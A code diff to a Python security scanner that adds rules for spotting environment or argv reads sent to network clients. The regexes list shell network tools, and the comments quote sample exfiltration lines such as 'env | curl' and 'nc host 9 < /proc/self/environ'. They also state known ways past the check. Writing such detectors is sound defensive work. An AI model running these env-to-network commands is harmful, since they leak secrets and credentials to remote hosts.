@@ -36,6 +36,11 @@ import re
 from pathlib import Path
 from typing import Final
 
+from _skillaudit_typescript_context import (  # type: ignore[import-not-found]
+    _is_benign_env_read,
+    _window_has_exfil_sink,
+)
+
 # Print commands that consume a heredoc and emit it as text (no exec).
 # ``tee`` writes to a file, which is also non-exec content. We DO NOT
 # include ``bash``/``sh``/``zsh`` (those *execute* the heredoc) nor
@@ -707,6 +712,58 @@ _EXFIL_SINK_RE: Final[re.Pattern[str]] = re.compile(
 def _line_has_exfil_sink(line: str) -> bool:
     """True iff ``line`` pipes/redirects data INTO a network egress sink."""
     return bool(_EXFIL_SINK_RE.search(line))
+
+
+# The TypeScript sink set (`_window_has_exfil_sink`) is JS-shaped (fetch/axios/
+# webhook hosts) and has no shell network tool, so a `node -p … process.argv`
+# probe next to `curl -d "$v" https://host` would be cleared by it alone. This
+# shell-side set closes that gap: a network client invocation (not loopback-only)
+# or a pipe/redirect into one anywhere in the window keeps the read visible.
+# Known limits (heuristic, fails toward clearing only when no listed client is
+# present): the loopback exemption is per LINE, so `curl localhost; curl evil`
+# on one line escapes it; python/node/perl HTTP calls are not modelled.
+_SHELL_NET_TOOL_RE: Final[re.Pattern[str]] = re.compile(
+    r"(?:^|[\s;&|(`])(?:sudo\s+)?(?:curl|wget|nc|ncat|netcat|socat|ssh|scp|sftp|ftp|telnet)\b"
+)
+
+
+def _window_has_shell_net_sink(lines: list[str], line_idx: int, span: int = 8) -> bool:
+    """True iff any line within ±``span`` of ``line_idx`` runs a network client
+    to a non-loopback destination or pipes/redirects data into a network sink."""
+    lo = max(0, line_idx - span)
+    hi = min(len(lines), line_idx + span + 1)
+    for line in lines[lo:hi]:
+        if _line_has_exfil_sink(line):
+            return True
+        if _SHELL_NET_TOOL_RE.search(line) and not _line_has_loopback_or_private_ip_shell(line):
+            return True
+    return False
+
+# An environment / argv READ on the same line as a network client. Shapes:
+# `env | curl …`, `printenv | nc host 9`, `node -p "process.argv" | curl …`,
+# `curl -d "$(env)" URL`, `nc host 9 < /proc/self/environ`. `env`/`printenv`
+# count only as a bare read (followed by a pipe / `;` / `&` / `)` / backtick /
+# redirect / end of line), so the launcher form `env FOO=1 curl URL` is not one.
+_ENV_ARGV_READ_RE: Final[re.Pattern[str]] = re.compile(
+    r"(?:^|[\s;&|(`$])(?:env|printenv)\s*(?:[|;&)`<>]|$)"
+    r"|process\.(?:env|argv)\b"
+    r"|\bos\.environ\b"
+    r"|/proc/(?:self|\d+)/environ\b"
+    r"|\b(?:export\s+-p|declare\s+-x)\b",
+    re.IGNORECASE,
+)
+
+
+def _shell_line_is_env_read_to_net_sink(line: str) -> bool:
+    """True iff one shell line reads the environment / argv AND hands it to a
+    non-loopback network client (curl / wget / nc / ncat / netcat / socat …).
+
+    This is an exfiltration shape, never test scaffolding: a test fixture that
+    needs the SUT's environment does not ship it to a remote host. Used so the
+    shell-test-file blanket suppression cannot hide it."""
+    if not (_ENV_ARGV_READ_RE.search(line) and (_line_has_exfil_sink(line) or _SHELL_NET_TOOL_RE.search(line))):
+        return False
+    return not _line_has_loopback_or_private_ip_shell(line)
 
 
 def _line_leaks_secret_var_to_url(line: str) -> bool:
@@ -1667,8 +1724,27 @@ def classify(
     ) and _line_has_loopback_or_private_ip_shell(line_text):
         return "safe_literal"
 
+    # Client FP (find-node.sh): a `node -p` version probe reads `process.argv`,
+    # which the ENV_RECON catalog pattern flags HIGH. Parity with the TypeScript
+    # classifier: an inert env read (cwd / argv / os.*) with no exfil sink within
+    # 8 lines cannot exfiltrate. Exfil-bundled shapes (`env | curl`, `printenv … nc`)
+    # do not match the benign-read set, and a sink in the window keeps it visible.
+    # The verdict is returned ONLY on the two non-heredoc exits below: inside a
+    # print heredoc the heredoc verdict (e.g. `safe_doc` for an interpolating
+    # unquoted body) is stricter and must not be pre-empted by this clear.
+    env_recon_verdict = (
+        "safe_literal"
+        if (
+            rule_id == "ENV_RECON"
+            and _is_benign_env_read(line_text, match)
+            and not _window_has_exfil_sink(content, line_idx, span=8)
+            and not _window_has_shell_net_sink(lines, line_idx, span=8)
+        )
+        else ""
+    )
+
     if line_idx == 0:
-        return ""
+        return env_recon_verdict
     # `_` underscores below used by intent — pylint-style noqa not needed.
     open_heredocs: list[tuple[str, bool]] = []  # (delimiter, is_quoted)
     for i in range(line_idx):
@@ -1687,7 +1763,7 @@ def classify(
             # delimiter (`<<'EOF'` / `<<"END"`) disables ALL expansion in the body.
             open_heredocs.append((m.group(2), bool(m.group(1))))
     if not open_heredocs:
-        return ""
+        return env_recon_verdict
 
     # #83.5 — the match line is inside a PRINT heredoc body (printed text, not
     # run). For an EXECUTION-class rule the body is fully INERT — promote to
